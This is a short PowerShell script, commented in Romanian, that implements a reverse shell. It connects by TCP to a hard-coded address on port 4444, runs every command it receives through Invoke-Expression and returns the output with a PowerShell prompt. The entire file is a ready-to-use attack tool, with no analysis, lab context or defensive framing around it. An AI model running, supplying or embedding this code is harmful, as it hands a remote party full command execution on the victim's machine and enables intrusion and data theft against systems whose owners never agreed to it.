# Setează IP-ul tău aici
$ip = "192.168.100.78"
$port = 4444

# Creează conexiunea TCP
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# Loop principal pentru citire și execuție
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
